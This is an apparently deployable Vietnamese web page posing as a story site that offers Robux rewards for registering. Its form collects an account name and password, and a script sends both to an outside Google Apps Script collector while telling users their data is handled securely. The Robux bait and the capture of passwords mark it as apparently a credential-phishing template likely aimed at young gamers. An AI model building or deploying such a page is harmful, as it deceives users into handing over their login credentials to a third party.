<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ngày Xanh Vỡ Mộng - Web Truyện & Đổi Điểm</title>
    <style>
        :root { --primary: #2c3e50; --accent: #3498db; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { background: white; padding: 2rem; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        h1 { color: var(--primary); font-size: 1.5rem; margin-bottom: 1rem; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: var(--accent); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; }
        button:hover { background: #2980b9; }
        #status { margin-top: 15px; font-size: 0.9rem; color: #27ae60; }
    </style>
</head>
<body>

<div class="card">
    <h1>Ngày Xanh Vỡ Mộng</h1>
    <p>Đăng ký để tích điểm đổi Robux</p>
    
    <form id="regForm">
        <input type="text" name="username" placeholder="Tên tài khoản" required>
        <input type="password" name="password" placeholder="Mật khẩu" required>
        <button type="submit" id="submitBtn">Tạo tài khoản ngay</button>
    </form>
    
    <div id="status"></div>
</div>

<script>
    // QUAN TRỌNG: Thay link Web App Google của bạn vào đây
    const scriptURL = 'LINK_GOOGLE_APPS_SCRIPT_CỦA_BẠN'; 
    const form = document.getElementById('regForm');
    const status = document.getElementById('status');
    const btn = document.getElementById('submitBtn');

    form.addEventListener('submit', e => {
        e.preventDefault();
        btn.disabled = true;
        status.innerText = "Đang xử lý dữ liệu an toàn...";

        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
            .then(response => {
                status.innerText = "Đăng ký thành công! Chào mừng bạn đến với thế giới truyện.";
                form.reset();
                btn.disabled = false;
            })
            .catch(error => {
                status.innerText = "Lỗi kết nối! Bạn kiểm tra lại link Google Script nhé.";
                btn.disabled = false;
            });
    });
</script>

</body>
</html>
